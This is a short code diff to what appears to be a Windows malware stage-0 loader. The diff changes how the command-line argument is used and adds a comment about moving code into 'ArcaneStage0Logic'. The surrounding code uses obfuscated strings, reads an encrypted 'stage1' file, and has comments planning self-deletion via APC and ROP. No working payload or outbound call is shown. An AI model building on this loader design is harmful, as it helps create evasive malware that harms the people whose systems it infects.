@@ -9,7 +9,7 @@ static const std::string_view STAGE1_ENCRYPTED_FILENAME = OBFUSCATE("stage1_encr
 int wWinMain(
     UNUSED(_In_ HINSTANCE hInstance),
     UNUSED(_In_opt_ HINSTANCE hPrevInstance),
-    UNUSED(_In_ LPWSTR lpCmdLine),
+    _In_ LPWSTR lpCmdLine,
     UNUSED(_In_ int nShowCmd)
 )
 {
@@ -21,6 +21,8 @@ int wWinMain(
 
         // Self delete APC class -> make root class
         // self delete ROP class
+
+        // export this into ArcaneStage0Logic
 
         File stage1_encrypted_file(STAGE1_ENCRYPTED_FILENAME, FileAccess::GenericRead, FileShare::None, FileCreationDisposition::OpenExisting);
         ByteVector stage1_encrypted = stage1_encrypted_file.read(stage1_encrypted_file.size());
